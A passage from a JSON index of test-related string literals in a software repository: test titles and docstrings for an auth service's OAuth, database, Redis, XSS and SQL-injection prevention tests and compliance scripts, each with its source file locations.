      ]
    },
    "Test 19: Race condition in duplicate user creation": {
      "value": "Test 19: Race condition in duplicate user creation",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:913"
      ]
    },
    "Test 1: Basic successful OAuth login flow - THE DEFAULT CASE\n        This MUST work in production but is designed to initially fail.": {
      "value": "Test 1: Basic successful OAuth login flow - THE DEFAULT CASE\n        This MUST work in production but is designed to initially fail.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:113"
      ]
    },
    "Test 20: JWT token validation and structure (L3)": {
      "value": "Test 20: JWT token validation and structure (L3)",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:968"
      ]
    },
    "Test 21: WebSocket authentication token validation (L3)": {
      "value": "Test 21: WebSocket authentication token validation (L3)",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1016"
      ]
    },
    "Test 22: CORS failure for cross-origin OAuth requests": {
      "value": "Test 22: CORS failure for cross-origin OAuth requests",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1070"
      ]
    },
    "Test 23: Redirect URI mismatch attack prevention": {
      "value": "Test 23: Redirect URI mismatch attack prevention",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1091"
      ]
    },
    "Test 24: Token injection attack prevention": {
      "value": "Test 24: Token injection attack prevention",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1112"
      ]
    },
    "Test 25: Session fixation attack prevention": {
      "value": "Test 25: Session fixation attack prevention",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1141"
      ]
    },
    "Test 26: Extremely long email address handling": {
      "value": "Test 26: Extremely long email address handling",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1161"
      ]
    },
    "Test 27: Unicode and special characters in user name": {
      "value": "Test 27: Unicode and special characters in user name",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1207"
      ]
    },
    "Test 28: Null values in OAuth provider response": {
      "value": "Test 28: Null values in OAuth provider response",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1254"
      ]
    },
    "Test 29: Concurrent login attempts from same user": {
      "value": "Test 29: Concurrent login attempts from same user",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1301"
      ]
    },
    "Test 2: PKCE code challenge verification failure (L3)": {
      "value": "Test 2: PKCE code challenge verification failure (L3)",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:172"
      ]
    },
    "Test 30: Token refresh while session is actively being used": {
      "value": "Test 30: Token refresh while session is actively being used",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1354"
      ]
    },
    "Test 3: OAuth nonce replay attack prevention (L3 with mock Redis)": {
      "value": "Test 3: OAuth nonce replay attack prevention (L3 with mock Redis)",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:207"
      ]
    },
    "Test 4: OAuth code reuse attack prevention": {
      "value": "Test 4: OAuth code reuse attack prevention",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:284"
      ]
    },
    "Test 5: CSRF token binding to session failure (L3)": {
      "value": "Test 5: CSRF token binding to session failure (L3)",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:323"
      ]
    },
    "Test 6: HMAC signature verification failure on state parameter (L3)": {
      "value": "Test 6: HMAC signature verification failure on state parameter (L3)",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:350"
      ]
    },
    "Test 7: Expired state parameter (>10 minutes)": {
      "value": "Test 7: Expired state parameter (>10 minutes)",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:387"
      ]
    },
    "Test 8: Malformed ID token from OAuth provider": {
      "value": "Test 8: Malformed ID token from OAuth provider",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:416"
      ]
    },
    "Test 9: Invalid JWT signature in ID token": {
      "value": "Test 9: Invalid JWT signature in ID token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:459"
      ]
    },
    "Test Agent Initialization - Verify robust startup mechanisms\n\nSimple test to validate that the agent initialization improvements work correctly.\nTests fallback mechanisms, error handling, and graceful degradation.": {
      "value": "Test Agent Initialization - Verify robust startup mechanisms\n\nSimple test to validate that the agent initialization improvements work correctly.\nTests fallback mechanisms, error handling, and graceful degradation.",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:1"
      ]
    },
    "Test Auth Service Database Authentication Failures\nTests that replicate the database authentication issues found in production logs.\n\nCRITICAL AUTHENTICATION ISSUES TO REPLICATE:\n1. \"password authentication failed for user 'user_pr-4'\" \n2. \"password authentication failed for user 'postgres'\"\n3. Table creation skipped due to authentication errors\n4. Socket closure issues during shutdown\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Prevent database authentication failures in production\n- Value Impact: Ensures auth service can connect with proper credentials\n- Strategic Impact: Prevents authentication service downtime affecting all customers": {
      "value": "Test Auth Service Database Authentication Failures\nTests that replicate the database authentication issues found in production logs.\n\nCRITICAL AUTHENTICATION ISSUES TO REPLICATE:\n1. \"password authentication failed for user 'user_pr-4'\" \n2. \"password authentication failed for user 'postgres'\"\n3. Table creation skipped due to authentication errors\n4. Socket closure issues during shutdown\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Prevent database authentication failures in production\n- Value Impact: Ensures auth service can connect with proper credentials\n- Strategic Impact: Prevents authentication service downtime affecting all customers",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:1"
      ]
    },
    "Test Auth Service Database Connection Validation\nTests the actual database connection mechanism and table creation process.\n\nCRITICAL VALIDATION ISSUES TO REPLICATE:\n1. Database connection validation bypassed during initialization\n2. Table creation failing silently when authentication is invalid\n3. Health checks failing due to credential inconsistencies \n4. Connection pool exhaustion during authentication retries\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Ensure reliable database connectivity validation\n- Value Impact: Prevents silent failures and improves error detection\n- Strategic Impact: Reduces production downtime and improves service reliability": {
      "value": "Test Auth Service Database Connection Validation\nTests the actual database connection mechanism and table creation process.\n\nCRITICAL VALIDATION ISSUES TO REPLICATE:\n1. Database connection validation bypassed during initialization\n2. Table creation failing silently when authentication is invalid\n3. Health checks failing due to credential inconsistencies \n4. Connection pool exhaustion during authentication retries\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Ensure reliable database connectivity validation\n- Value Impact: Prevents silent failures and improves error detection\n- Strategic Impact: Reduces production downtime and improves service reliability",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:1"
      ]
    },
    "Test Auth Service Database Manager\nVerifies that the auth service database manager properly handles URL transformations\nand SSL parameter conversions according to the learnings.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Auth service reliability and stability\n- Value Impact: Prevents database connection failures in production\n- Strategic Impact: Ensures auth service can operate independently": {
      "value": "Test Auth Service Database Manager\nVerifies that the auth service database manager properly handles URL transformations\nand SSL parameter conversions according to the learnings.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Auth service reliability and stability\n- Value Impact: Prevents database connection failures in production\n- Strategic Impact: Ensures auth service can operate independently",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_manager.py:1"
      ]
    },
    "Test Auth Service Graceful Shutdown Failures\nTests that replicate shutdown timeout and socket closure issues.\n\nCRITICAL SHUTDOWN ISSUES TO REPLICATE:\n1. \"Shutdown timeout exceeded\" warnings during service termination\n2. Socket closure errors during cleanup operations  \n3. Connection pool not properly disposed during shutdown\n4. Background tasks not properly cancelled during auth failures\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal  \n- Business Goal: Ensure graceful service shutdown and resource cleanup\n- Value Impact: Prevents resource leaks and improves service reliability\n- Strategic Impact: Enables proper service lifecycle management in production": {
      "value": "Test Auth Service Graceful Shutdown Failures\nTests that replicate shutdown timeout and socket closure issues.\n\nCRITICAL SHUTDOWN ISSUES TO REPLICATE:\n1. \"Shutdown timeout exceeded\" warnings during service termination\n2. Socket closure errors during cleanup operations  \n3. Connection pool not properly disposed during shutdown\n4. Background tasks not properly cancelled during auth failures\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal  \n- Business Goal: Ensure graceful service shutdown and resource cleanup\n- Value Impact: Prevents resource leaks and improves service reliability\n- Strategic Impact: Enables proper service lifecycle management in production",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:1"
      ]
    },
    "Test Auth Service Integration": {
      "value": "Test Auth Service Integration",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:167"
      ]
    },
    "Test Auth Service Integration\nVerifies that the auth service is properly integrated with backend and frontend": {
      "value": "Test Auth Service Integration\nVerifies that the auth service is properly integrated with backend and frontend",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:2"
      ]
    },
    "Test Auth Service Staging Database Credentials\nTests that validate database credential configuration for staging environment.\n\nCRITICAL VALIDATION FOR STAGING:\n1. Correct database credentials are loaded from environment\n2. Staging-specific DATABASE_URL format is valid  \n3. Cloud SQL proxy configuration compatibility\n4. Credential validation before deployment\n5. No invalid user patterns like 'user_pr-4'\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Prevent staging deployment failures due to credential issues\n- Value Impact: Ensures auth service can connect to staging database successfully  \n- Strategic Impact: Prevents auth service downtime that affects all customer authentication": {
      "value": "Test Auth Service Staging Database Credentials\nTests that validate database credential configuration for staging environment.\n\nCRITICAL VALIDATION FOR STAGING:\n1. Correct database credentials are loaded from environment\n2. Staging-specific DATABASE_URL format is valid  \n3. Cloud SQL proxy configuration compatibility\n4. Credential validation before deployment\n5. No invalid user patterns like 'user_pr-4'\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Prevent staging deployment failures due to credential issues\n- Value Impact: Ensures auth service can connect to staging database successfully  \n- Strategic Impact: Prevents auth service downtime that affects all customer authentication",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:1"
      ]
    },
    "Test Auth service with the ACTUAL staging credentials from Secret Manager.\nThis test validates the exact configuration that would be used in production.": {
      "value": "Test Auth service with the ACTUAL staging credentials from Secret Manager.\nThis test validates the exact configuration that would be used in production.",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:1"
      ]
    },
    "Test AuthConfig database URL generation.": {
      "value": "Test AuthConfig database URL generation.",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:167"
      ]
    },
    "Test AuthDatabase proper initialization with validation.": {
      "value": "Test AuthDatabase proper initialization with validation.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:178"
      ]
    },
    "Test CORS configuration": {
      "value": "Test CORS configuration",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:105"
      ]
    },
    "Test CORS validation.": {
      "value": "Test CORS validation.",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:143"
      ]
    },
    "Test CSRF protection for state-changing operations": {
      "value": "Test CSRF protection for state-changing operations",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:346"
      ]
    },
    "Test Client for Auth Service\nHTTP test client with authentication helpers for testing auth endpoints.\nProvides convenient methods for auth operations and request handling.": {
      "value": "Test Client for Auth Service\nHTTP test client with authentication helpers for testing auth endpoints.\nProvides convenient methods for auth operations and request handling.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_client.py:1"
      ]
    },
    "Test Cloud SQL URL handling in auth service\nEnsures proper handling of Cloud SQL Unix socket format": {
      "value": "Test Cloud SQL URL handling in auth service\nEnsures proper handling of Cloud SQL Unix socket format",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_cloud_sql_url.py:1"
      ]
    },
    "Test Compliance Checker\nEnsures test files follow the same quality standards as production code:\n- Maximum 300 lines per file\n- Maximum 8 lines per function\n- No mock component implementations inside test files": {
      "value": "Test Compliance Checker\nEnsures test files follow the same quality standards as production code:\n- Maximum 300 lines per file\n- Maximum 8 lines per function\n- No mock component implementations inside test files",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:2"
      ]
    },
    "Test Configuration:": {
      "value": "Test Configuration:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:363"
      ]
    },
    "Test Database Configuration\nHandles database setup, isolation, and cleanup for auth service tests.\nEach test gets isolated database state with proper cleanup.": {
      "value": "Test Database Configuration\nHandles database setup, isolation, and cleanup for auth service tests.\nEach test gets isolated database state with proper cleanup.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/database/test_config.py:1"
      ]
    },
    "Test Environment Configuration\nManages environment variables and configuration for auth service tests.\nEnsures test isolation and proper cleanup of environment state.": {
      "value": "Test Environment Configuration\nManages environment variables and configuration for auth service tests.\nEnsures test isolation and proper cleanup of environment state.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:1"
      ]
    },
    "Test File Size Violations (>300 lines):": {
      "value": "Test File Size Violations (>300 lines):",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:65"
      ]
    },
    "Test Fixer Examples:": {
      "value": "Test Fixer Examples:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:381"
      ]
    },
    "Test Fixer for Real Test Requirements\n\nProvides automated and semi-automated fixes for test requirement violations.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Development Velocity\n- Value Impact: Automates compliance with real test requirements\n- Strategic Impact: Reduces manual fix effort and prevents regressions": {
      "value": "Test Fixer for Real Test Requirements\n\nProvides automated and semi-automated fixes for test requirement violations.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Development Velocity\n- Value Impact: Automates compliance with real test requirements\n- Strategic Impact: Reduces manual fix effort and prevents regressions",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:1"
      ]
    },
    "Test Function Violations (>8 lines):": {
      "value": "Test Function Violations (>8 lines):",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:66"
      ]
    },
    "Test Helper Functions\nUtility functions for auth service testing operations.\nProvides common functionality for test setup, data creation, and assertions.": {
      "value": "Test Helper Functions\nUtility functions for auth service testing operations.\nProvides common functionality for test setup, data creation, and assertions.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_helpers.py:1"
      ]
    },
    "Test JSON output format": {
      "value": "Test JSON output format",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:146"
      ]
    },
    "Test JWT token format validation": {
      "value": "Test JWT token format validation",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:583"
      ]
    },
    "Test Limits Examples - See function docstrings for splitting strategies": {
      "value": "Test Limits Examples - See function docstrings for splitting strategies",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_examples.py:263"
      ]
    },
    "Test Limits Violation Examples and Fixes\nDemonstrates how to fix common test limit violations according to SPEC/testing.xml": {
      "value": "Test Limits Violation Examples and Fixes\nDemonstrates how to fix common test limit violations according to SPEC/testing.xml",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_examples.py:2"
      ]
    },
    "Test Mixins for Auth Service\nReusable test functionality as mixins for specific concerns.\nEach mixin provides focused functionality following single responsibility.": {
      "value": "Test Mixins for Auth Service\nReusable test functionality as mixins for specific concerns.\nEach mixin provides focused functionality following single responsibility.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:1"
      ]
    },
    "Test OAuth PKCE Token Refresh Flow\nTests the critical OAuth 2.1 PKCE token refresh process - currently missing from test coverage": {
      "value": "Test OAuth PKCE Token Refresh Flow\nTests the critical OAuth 2.1 PKCE token refresh process - currently missing from test coverage",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_token_refresh.py:1"
      ]
    },
    "Test OAuth authentication flow": {
      "value": "Test OAuth authentication flow",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:125"
      ]
    },
    "Test OAuth configuration endpoint": {
      "value": "Test OAuth configuration endpoint",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:139"
      ]
    },
    "Test OAuth flow locally with enhanced debugging": {
      "value": "Test OAuth flow locally with enhanced debugging",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:434"
      ]
    },
    "Test OAuth login initiation": {
      "value": "Test OAuth login initiation",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:180"
      ]
    },
    "Test OAuth provider failover in staging environment": {
      "value": "Test OAuth provider failover in staging environment",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1446"
      ]
    },
    "Test OAuth security manager falls back to memory when Redis unavailable": {
      "value": "Test OAuth security manager falls back to memory when Redis unavailable",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:108"
      ]
    },
    "Test OAuth state management works during Redis failover": {
      "value": "Test OAuth state management works during Redis failover",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:344"
      ]
    },
    "Test Overlap Analyzer\nAnalyzes test files for similarity and potential duplication using vector similarity techniques.": {
      "value": "Test Overlap Analyzer\nAnalyzes test files for similarity and potential duplication using vector similarity techniques.",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:1"
      ]
    },
    "Test PostgreSQL compliance for auth service\nVerifies all PostgreSQL learnings are properly implemented\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal  \n- Business Goal: Auth service stability and reliability\n- Value Impact: Ensure robust database connections and configuration\n- Strategic Impact: Prevent database-related auth failures in production": {
      "value": "Test PostgreSQL compliance for auth service\nVerifies all PostgreSQL learnings are properly implemented\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal  \n- Business Goal: Auth service stability and reliability\n- Value Impact: Ensure robust database connections and configuration\n- Strategic Impact: Prevent database-related auth failures in production",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:1"
      ]
    },
    "Test Process Cleanup Utility\nCleans up hanging Node.js and Python test processes on Windows": {
      "value": "Test Process Cleanup Utility\nCleans up hanging Node.js and Python test processes on Windows",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:2"
      ]
    },
    "Test Quality Report (Report Only)": {
      "value": "Test Quality Report (Report Only)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:422"
      ]
    },
    "Test Redis connection health monitoring and reconnection": {
      "value": "Test Redis connection health monitoring and reconnection",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:266"
      ]
    },
    "Test Redis connection recovery after becoming available": {
      "value": "Test Redis connection recovery after becoming available",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:137"
      ]
    },
    "Test Redis session synchronization with database cleanup": {
      "value": "Test Redis session synchronization with database cleanup",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:244"
      ]
    },
    "Test Report Analyzer - Analyzes test reports and identifies issues.": {
      "value": "Test Report Analyzer - Analyzes test reports and identifies issues.",
      "category": "test_literals",
      "locations": [
        "scripts/team_updates_test_analyzer.py:1"
      ]
    },
    "Test Results:": {
      "value": "Test Results:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:316",
        "scripts/test_auth_integration.py:141"
      ]
    },
    "Test Runner for Example Message Flow System\n\nComprehensive test runner for the example message flow implementation\nwith detailed reporting and validation.\n\nBusiness Value: Ensures reliability of AI optimization demonstration system": {
      "value": "Test Runner for Example Message Flow System\n\nComprehensive test runner for the example message flow implementation\nwith detailed reporting and validation.\n\nBusiness Value: Ensures reliability of AI optimization demonstration system",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:1"
      ]
    },
    "Test SQL injection attempts are logged": {
      "value": "Test SQL injection attempts are logged",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:502"
      ]
    },
    "Test SQL injection attempts in login endpoint": {
      "value": "Test SQL injection attempts in login endpoint",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:117"
      ]
    },
    "Test SQL injection in service token endpoint": {
      "value": "Test SQL injection in service token endpoint",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:202"
      ]
    },
    "Test SQL injection in token validation": {
      "value": "Test SQL injection in token validation",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:172"
      ]
    },
    "Test SSL certificate handling for staging database connections.": {
      "value": "Test SSL certificate handling for staging database connections.",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:1"
      ]
    },
    "Test Settings Configuration\nCentralized test configuration and settings management.\nProvides type-safe configuration for different test scenarios.": {
      "value": "Test Settings Configuration\nCentralized test configuration and settings management.\nProvides type-safe configuration for different test scenarios.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_settings.py:1"
      ]
    },
    "Test Size Violations Analysis and Reporting Script\n\n!!!! CRITICAL WARNING !!!!\nThis script is designed ONLY for analysis and reporting of test size violations.\nThe auto-fix capabilities are DISABLED by default and should ONLY be used:\n1. In dry-run mode for planning manual refactoring\n2. With explicit human review before any actual changes\n3. After backing up all affected files\n4. With immediate test validation after any changes\n\nNEVER use auto-fix in production code without thorough review!\n\nCapabilities:\n1. ANALYZE test files for size violations (SAFE)\n2. REPORT violations and suggest improvements (SAFE)\n3. DRY-RUN mode to preview potential changes (SAFE)\n4. ACTUAL fixes require explicit opt-in and multiple confirmations (DANGEROUS)\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Code Quality Analysis and Reporting\n- Value Impact: Identifies technical debt for manual remediation\n- Strategic/Revenue Impact: Provides metrics for prioritizing refactoring efforts": {
      "value": "Test Size Violations Analysis and Reporting Script\n\n!!!! CRITICAL WARNING !!!!\nThis script is designed ONLY for analysis and reporting of test size violations.\nThe auto-fix capabilities are DISABLED by default and should ONLY be used:\n1. In dry-run mode for planning manual refactoring\n2. With explicit human review before any actual changes\n3. After backing up all affected files\n4. With immediate test validation after any changes\n\nNEVER use auto-fix in production code without thorough review!\n\nCapabilities:\n1. ANALYZE test files for size violations (SAFE)\n2. REPORT violations and suggest improvements (SAFE)\n3. DRY-RUN mode to preview potential changes (SAFE)\n4. ACTUAL fixes require explicit opt-in and multiple confirmations (DANGEROUS)\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Code Quality Analysis and Reporting\n- Value Impact: Identifies technical debt for manual remediation\n- Strategic/Revenue Impact: Provides metrics for prioritizing refactoring efforts",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:2"
      ]
    },
    "Test Staging Startup Sequence\nTests the complete startup sequence for staging deployment.\nValidates service initialization order, dependencies, and configuration.": {
      "value": "Test Staging Startup Sequence\nTests the complete startup sequence for staging deployment.\nValidates service initialization order, dependencies, and configuration.",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:2"
      ]
    },
    "Test Stub Detection and Removal Script\n\nThis script automatically detects test stubs, mock implementations, and placeholder\ncode in production files according to the SPEC/no_test_stubs.xml specification.\n\nUsage:\n    python scripts/remove_test_stubs.py --scan          # Scan for test stubs\n    python scripts/remove_test_stubs.py --fix           # Fix detected stubs\n    python scripts/remove_test_stubs.py --report        # Generate detailed report": {
      "value": "Test Stub Detection and Removal Script\n\nThis script automatically detects test stubs, mock implementations, and placeholder\ncode in production files according to the SPEC/no_test_stubs.xml specification.\n\nUsage:\n    python scripts/remove_test_stubs.py --scan          # Scan for test stubs\n    python scripts/remove_test_stubs.py --fix           # Fix detected stubs\n    python scripts/remove_test_stubs.py --report        # Generate detailed report",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:2"
      ]
    },
    "Test Stub Detection and Removal Tool": {
      "value": "Test Stub Detection and Removal Tool",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:354"
      ]
    },
    "Test Summary": {
      "value": "Test Summary",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:179"
      ]
    },
    "Test TCP connection as fallback (should fail from local).": {
      "value": "Test TCP connection as fallback (should fail from local).",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:86"
      ]
    },
    "Test URL normalization handles all PostgreSQL URL formats.": {
      "value": "Test URL normalization handles all PostgreSQL URL formats.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:35"
      ]
    },
    "Test URL:": {
      "value": "Test URL:",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:130"
      ]
    },
    "Test User": {
      "value": "Test User",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/conftest.py:158",
        "auth_service/tests/factories/user_factory.py:39",
        "auth_service/tests/integration/test_auth_database_connection.py:39",
        "auth_service/tests/integration/test_auth_database_connection.py:45",
        "auth_service/tests/integration/test_auth_oauth_errors.py:55",
        "auth_service/tests/integration/test_auth_oauth_google.py:48",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:122",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:255",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:441",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:491"
      ]
    },
    "Test Violations Reporter - Focus specifically on test file and function violations\nGenerates detailed reports with splitting suggestions for test limit violations.": {
      "value": "Test Violations Reporter - Focus specifically on test file and function violations\nGenerates detailed reports with splitting suggestions for test limit violations.",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:2"
      ]
    },
    "Test WebSocket configuration endpoint.": {
      "value": "Test WebSocket configuration endpoint.",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:83"
      ]
    },
    "Test WebSocket connection and functionality.": {
      "value": "Test WebSocket connection and functionality.",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:170"
      ]
    },
    "Test WebSocket connection.": {
      "value": "Test WebSocket connection.",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:262"
      ]
    },
    "Test WebSocket connectivity": {
      "value": "Test WebSocket connectivity",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:146"
      ]
    },
    "Test WebSocket health endpoint.": {
      "value": "Test WebSocket health endpoint.",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:113"
      ]
    },
    "Test XSS prevention in OAuth callback parameters": {
      "value": "Test XSS prevention in OAuth callback parameters",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:312"
      ]
    },
    "Test XSS prevention in User-Agent header": {
      "value": "Test XSS prevention in User-Agent header",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:274"
      ]
    },
    "Test XSS prevention in login inputs": {
      "value": "Test XSS prevention in login inputs",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:245"
      ]
    },
    "Test a single endpoint": {
      "value": "Test a single endpoint",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:39"
      ]
    },
    "Test agent": {
      "value": "Test agent",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:42"
      ]
    },
    "Test alignment complete!": {
      "value": "Test alignment complete!",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:62"
      ]
    },
    "Test all imports (comprehensive, slower)": {
      "value": "Test all imports (comprehensive, slower)",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:42"
      ]
    },
    "Test assertion failed": {
      "value": "Test assertion failed",
      "category": "test_literals",
      "locations": [
        "scripts/team_updates_test_analyzer.py:123"
      ]
    },
    "Test async PostgreSQL connections for both backend and auth services\n\nThis script verifies that the new async-only PostgreSQL configuration\nworks correctly in local development environment.": {
      "value": "Test async PostgreSQL connections for both backend and auth services\n\nThis script verifies that the new async-only PostgreSQL configuration\nworks correctly in local development environment.",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:2"
      ]
    },
    "Test async auth operations work.": {
      "value": "Test async auth operations work.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_service_integration_reliability.py:112"
      ]
    },
    "Test auth service API endpoints": {
      "value": "Test auth service API endpoints",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:40"
      ]
    },
    "Test auth service database connection": {
      "value": "Test auth service database connection",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:66"
      ]
    },
    "Test auth service database connection and session management.": {
      "value": "Test auth service database connection and session management.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_database_connection.py:1"
      ]
    },
